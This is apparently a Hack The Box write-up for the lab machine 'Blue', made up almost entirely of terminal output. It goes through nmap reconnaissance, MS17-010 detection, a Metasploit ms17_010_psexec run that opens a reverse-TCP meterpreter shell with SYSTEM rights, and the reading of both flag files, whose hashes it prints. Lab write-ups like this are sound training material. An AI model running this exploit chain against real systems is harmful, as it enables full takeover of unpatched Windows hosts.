# Blue - https://www.hackthebox.com/machines/blue

```bash
nmap -sC -sV  10.129.212.131            
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-23 04:30 EDT
Nmap scan report for 10.129.212.131
Host is up (0.055s latency).
Not shown: 991 closed tcp ports (conn-refused)
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-05-23T08:31:28
|_  start_date: 2024-05-23T08:29:22
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: -19m58s, deviation: 34m38s, median: 1s
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: haris-PC
|   NetBIOS computer name: HARIS-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2024-05-23T09:31:25+01:00
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 70.41 seconds

```
```bash
sudo nmap -sV -p 445 --script smb-vuln-ms17-010 10.129.212.131
Nmap scan report for 10.129.212.131
Host is up (0.053s latency).

PORT    STATE SERVICE      VERSION
445/tcp open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.80 seconds
```
```bash
msfconsole
msf6 > search ms17-010
Matching Modules                                                                                                                                    
================                                                                                                                                    
                                                                                                                                                    
   #   Name                                           Disclosure Date  Rank     Check  Description                                                  
   -   ----                                           ---------------  ----     -----  -----------                                                  
   0   exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption                                                                                                                                                   
   1     \_ target: Automatic Target                  .                .        .      .                                                            
   2     \_ target: Windows 7                         .                .        .      .                                                            
   3     \_ target: Windows Embedded Standard 7       .                .        .      .                                                            
   4     \_ target: Windows Server 2008 R2            .                .        .      .                                                            
   5     \_ target: Windows 8                         .                .        .      .                                                            
   6     \_ target: Windows 8.1                       .                .        .      .                                                            
   7     \_ target: Windows Server 2012               .                .        .      .                                                            
   8     \_ target: Windows 10 Pro                    .                .        .      .                                                            
   9     \_ target: Windows 10 Enterprise Evaluation  .                .        .      .                                                            
   10  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution                                                                                                                         
   11    \_ target: Automatic                         .                .        .      .                                                            
   12    \_ target: PowerShell                        .                .        .      .                                                            
   13    \_ target: Native upload                     .                .        .      .
   14    \_ target: MOF upload                        .                .        .      .
   15    \_ AKA: ETERNALSYNERGY                       .                .        .      .
   16    \_ AKA: ETERNALROMANCE                       .                .        .      .
   17    \_ AKA: ETERNALCHAMPION                      .                .        .      .
   18    \_ AKA: ETERNALBLUE                          .                .        .      .
   19  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   20    \_ AKA: ETERNALSYNERGY                       .                .        .      .
   21    \_ AKA: ETERNALROMANCE                       .                .        .      .
   22    \_ AKA: ETERNALCHAMPION                      .                .        .      .
   23    \_ AKA: ETERNALBLUE                          .                .        .      .
   24  auxiliary/scanner/smb/smb_ms17_010             .                normal   No     MS17-010 SMB RCE Detection
   25    \_ AKA: DOUBLEPULSAR                         .                .        .      .
   26    \_ AKA: ETERNALBLUE                          .                .        .      .
   27  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
   28    \_ target: Execute payload (x64)             .                .        .      .
   29    \_ target: Neutralize implant                .                .        .      .


Interact with a module by name or index. For example info 29, use 29 or use exploit/windows/smb/smb_doublepulsar_rce
After interacting with a module you can manually set a TARGET with set TARGET 'Neutralize implant'
```
```bash
msf6 > use 10
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_psexec) > set RHOSTS 10.129.212.131
RHOSTS => 10.129.212.131
msf6 exploit(windows/smb/ms17_010_psexec) > set LHOST 10.10.14.56
LHOST => 10.10.14.56
msf6 exploit(windows/smb/ms17_010_psexec) > run
[*] Started reverse TCP handler on 10.10.14.56:4444 
[*] 10.129.212.131:445 - Target OS: Windows 7 Professional 7601 Service Pack 1
[*] 10.129.212.131:445 - Built a write-what-where primitive...
[+] 10.129.212.131:445 - Overwrite complete... SYSTEM session obtained!
[*] 10.129.212.131:445 - Selecting PowerShell target
[*] 10.129.212.131:445 - Executing the payload...
[+] 10.129.212.131:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (176198 bytes) to 10.129.212.131
[*] Meterpreter session 1 opened (10.10.14.56:4444 -> 10.129.212.131:49162) at 2024-05-23 05:33:41 -0400
```
```bash
meterpreter > pwd
C:\Windows\system32
meterpreter > cd ..
meterpreter > cd ..
meterpreter > cd ..
meterpreter > cd Users
meterpreter > ls
Listing: C:\Users
=================

Mode          Size  Type  Last modified        Name
----          ----  ----  -------------        ----
040777/rwxrw  8192  dir   2017-07-21 02:56:36  Administrator
xrwx                       -0400
040777/rwxrw  0     dir   2009-07-14 01:08:56  All Users
xrwx                       -0400
040555/r-xr-  8192  dir   2009-07-14 03:07:31  Default
xr-x                       -0400
040777/rwxrw  0     dir   2009-07-14 01:08:56  Default User
xrwx                       -0400
040555/r-xr-  4096  dir   2011-04-12 03:51:29  Public
xr-x                       -0400
100666/rw-rw  174   fil   2009-07-14 00:54:24  desktop.ini
-rw-                       -0400
040777/rwxrw  8192  dir   2017-07-14 09:45:53  haris
xrwx                       -0400
meterpreter > cd Administrator
meterpreter > cd Desktop
meterpreter > ls
Listing: C:\Users\Administrator\Desktop
=======================================

Mode           Size  Type  Last modified         Name
----           ----  ----  -------------         ----
100666/rw-rw-  282   fil   2017-07-21 02:56:40   desktop.ini
rw-                        -0400
100444/r--r--  34    fil   2024-05-23 04:29:57   root.txt
r--                        -0400

meterpreter > cat root.txt
45234b1f36032b6cb4720d47d137f65c
```
```bash
meterpreter > cd ..
meterpreter > pwd
C:\Users\Administrator
meterpreter > cd ..
meterpreter > cd haris
meterpreter > cd Desktop
meterpreter > ls
Listing: C:\Users\haris\Desktop
===============================

Mode           Size  Type  Last modified         Name
----           ----  ----  -------------         ----
100666/rw-rw-  282   fil   2017-07-15 03:58:32   desktop.ini
rw-                        -0400
100444/r--r--  34    fil   2024-05-23 04:29:57   user.txt
r--                        -0400

meterpreter > cat user.txt
9d74522ce7257455c53cc0fd834c089a
```
